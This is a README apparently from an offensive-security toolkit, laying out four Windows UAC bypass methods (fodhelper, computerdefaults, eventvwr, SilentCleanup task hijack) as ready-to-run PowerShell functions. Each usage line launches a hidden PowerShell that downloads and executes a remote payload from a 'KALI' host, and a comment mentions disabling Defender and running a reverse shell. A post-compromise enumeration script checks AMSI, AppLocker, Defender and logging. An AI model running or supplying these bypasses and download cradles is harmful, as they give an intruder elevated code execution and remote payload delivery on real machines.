# UAC Bypass

UAC (User Account Control) prompts when a program wants elevated privileges. These techniques trigger auto-elevating Windows binaries to run your payload at high integrity without showing a UAC prompt.

**Context:** You must already be running as a local administrator (even with medium integrity). These bypasses elevate from medium → high integrity (no prompt).

---

## Files

| File | Method | Reliability |
|------|--------|------------|
| `uacbypass.ps1` | fodhelper.exe registry hijack | High — works Win 10 up to recent builds |
| `uac-methods.ps1` | All methods (computerdefaults, eventvwr, DiskCleanup) | See notes per method |

---

## Method 1: fodhelper.exe (uacbypass.ps1) — PREFERRED

`fodhelper.exe` auto-elevates (has `autoElevate: true` in its manifest). It reads a registry key under HKCU when it launches. We write our payload there first.

**How it works:**
1. Create `HKCU:\Software\Classes\ms-settings\CurVer` pointing to a fake ProgID (`.yelow`)
2. Create the `.yelow` ProgID with a shell open command pointing to your payload
3. Launch `fodhelper.exe` — it reads the registry, triggers the shell command elevated
4. Cleanup: remove the fake registry keys

```powershell
# Edit the $program variable at the top of uacbypass.ps1 with your payload
# Then call:
. .\uacbypass.ps1
alt   # function name in the file

# Example — disable Defender and run a reverse shell:
# $program = 'Powershell -WindowStyle Hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://KALI/payload.ps1'')"'
```

---

## Method 2: computerdefaults.exe

Same mechanism as fodhelper — different auto-elevating binary. Use when fodhelper is patched/monitored.

```powershell
function Invoke-UACBypassComputerDefaults {
    param([string]$Payload = 'cmd.exe')

    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(default)" -Value $Payload -Force

    Start-Process "C:\Windows\System32\computerdefaults.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}

# Usage:
Invoke-UACBypassComputerDefaults -Payload 'powershell -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://KALI/payload.ps1'')"'
```

---

## Method 3: eventvwr.exe (older, patched in some builds)

Uses the same HKCU class hijack pattern. Works on Windows 7/8/10 older builds.

```powershell
function Invoke-UACBypassEventvwr {
    param([string]$Payload = 'cmd.exe')

    $regPath = "HKCU:\Software\Classes\mscfile\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(default)" -Value $Payload -Force

    Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force
}

Invoke-UACBypassEventvwr -Payload 'powershell -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://KALI/payload.ps1'')"'
```

---

## Method 4: DiskCleanup Scheduled Task Hijack

This uses a different mechanism — it hijacks the SYSTEM scheduled task `\Microsoft\Windows\DiskCleanup\SilentCleanup` which runs elevated automatically. The task runs an executable specified in an environment variable.

```powershell
function Invoke-UACBypassDiskCleanup {
    param([string]$Payload)

    # SilentCleanup task runs %windir%\system32\cleanmgr.exe
    # We can override %windir% via environment variable
    $env:windir = "cmd /K $Payload && REM "
    schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
    Start-Sleep 5
    # Clean up
    [System.Environment]::SetEnvironmentVariable("windir", $null, "User")
}

# Usage:
Invoke-UACBypassDiskCleanup -Payload 'powershell -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://KALI/payload.ps1'')"'
```

---

## Enumeration — Detecting UAC, AppLocker, Defender, AMSI on a new box

Run this immediately after getting a shell. Know what you're up against before you try anything.

```powershell
# ============================================================
# ENUMERATION: What defenses are running?
# ============================================================

# --- UAC LEVEL ---
# 0 = disabled, 1 = notify only, 2 = notify on changes (default), 5 = always notify
$uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Write-Host "[UAC] EnableLUA: $($uac.EnableLUA)"            # 0 = UAC off entirely
Write-Host "[UAC] ConsentPromptBehaviorAdmin: $($uac.ConsentPromptBehaviorAdmin)"
# 0 = elevate without prompt (easy bypass)
# 2 = prompt on secure desktop
# 5 = default (prompt for non-Windows)

# --- CURRENT INTEGRITY LEVEL ---
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
    Where-Object { $_.Value -eq "S-1-16-8192" } | ForEach-Object { Write-Host "[INTEGRITY] Medium" }
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
    Where-Object { $_.Value -eq "S-1-16-12288" } | ForEach-Object { Write-Host "[INTEGRITY] High — already elevated!" }
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
    Where-Object { $_.Value -eq "S-1-16-16384" } | ForEach-Object { Write-Host "[INTEGRITY] SYSTEM" }

# Short version:
whoami /groups | findstr "High Mandatory\|System Mandatory\|Medium Mandatory"

# --- APPLOCKER ---
$svc = Get-Service AppIDSvc -ErrorAction SilentlyContinue
Write-Host "[AppLocker] AppIDSvc: $($svc.Status)"   # Running = AppLocker is enforcing
# Check policy:
Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue |
    Select -ExpandProperty RuleCollections |
    ForEach-Object { Write-Host "[AppLocker] $($_.RuleCollectionType): $($_.EnforcementMode)" }
# EnforcementMode: AuditOnly = logging only, Enabled = blocking

# --- WINDOWS DEFENDER ---
# Real-time protection status:
Get-MpComputerStatus -ErrorAction SilentlyContinue | Select RealTimeProtectionEnabled, AMServiceEnabled, AntispywareEnabled, BehaviorMonitorEnabled
# Or quick check:
(Get-MpPreference -ErrorAction SilentlyContinue).DisableRealtimeMonitoring

# --- AMSI STATUS ---
# Test if AMSI is bypassed already:
$amsiStatus = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsiStatus) {
    $field = $amsiStatus.GetField('amsiInitFailed','NonPublic,Static')
    Write-Host "[AMSI] amsiInitFailed = $($field.GetValue($null))"   # True = bypassed
} else {
    Write-Host "[AMSI] AmsiUtils type not found"
}

# --- SCRIPT BLOCK LOGGING ---
$sblog = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
Write-Host "[SBL] EnableScriptBlockLogging: $($sblog.EnableScriptBlockLogging)"   # 1 = logging on

# --- CONSTRAINED LANGUAGE MODE ---
Write-Host "[CLM] LanguageMode: $($ExecutionContext.SessionState.LanguageMode)"
# FullLanguage = unrestricted, ConstrainedLanguage = AppLocker active

# --- EXECUTION POLICY ---
Write-Host "[ExecPolicy] $((Get-ExecutionPolicy -List | Where Scope -eq 'LocalMachine').ExecutionPolicy)"

# --- ALL IN ONE (paste this into any shell) ---
Write-Host "=== Defense Enumeration ===" -ForegroundColor Cyan
Write-Host "[UAC] $(((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System').EnableLUA -eq 1) ? 'Enabled' : 'DISABLED')"
Write-Host "[CLM] $($ExecutionContext.SessionState.LanguageMode)"
Write-Host "[Defender] $((Get-MpComputerStatus -EA SilentlyContinue).RealTimeProtectionEnabled)"
Write-Host "[AppLocker] $((Get-Service AppIDSvc -EA SilentlyContinue).Status)"
Write-Host "[SBL] $((Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -EA SilentlyContinue).EnableScriptBlockLogging)"
```

---

## Decision tree

```
I have a shell — what integrity level?
│
├── Already High/SYSTEM → skip UAC bypass
│
└── Medium integrity (standard user shell)?
    │
    ├── UAC EnableLUA = 0 → UAC disabled, just run admin commands
    │
    ├── ConsentPromptBehaviorAdmin = 0 → auto-elevate, try fodhelper
    │
    └── Normal UAC (value 5)?
        ├── Try fodhelper.exe → 95% success rate on Win10
        ├── If patched → try computerdefaults.exe
        ├── If on old box → eventvwr.exe
        └── Have scheduled task access → DiskCleanup hijack
```
